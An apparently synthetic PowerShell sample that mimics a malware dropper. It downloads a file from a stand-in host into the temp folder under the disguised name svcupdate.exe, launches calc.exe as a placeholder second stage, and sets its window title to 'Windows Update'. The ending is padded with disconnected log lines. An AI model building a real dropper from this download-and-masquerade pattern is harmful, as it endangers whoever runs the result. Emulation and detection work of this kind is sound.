[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$FetchUrl = "https://example.com/stage1.ps1",
    [string]$DropPath = "$env:TEMP\svcupdate.exe",
    [string]$TracePath = "$env:TEMP\stage.log",
    [int]$ConnectionTimeout = 177
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 177
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $ResultObject = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $DropPath -TimeoutSec $ConnectionTimeout
    if ($ResultObject) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $DropPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $DropPath
    TimeoutSec = $ConnectionTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Preparing working directory"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Inspecting process list"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
Set-Location -Path $env:TEMP
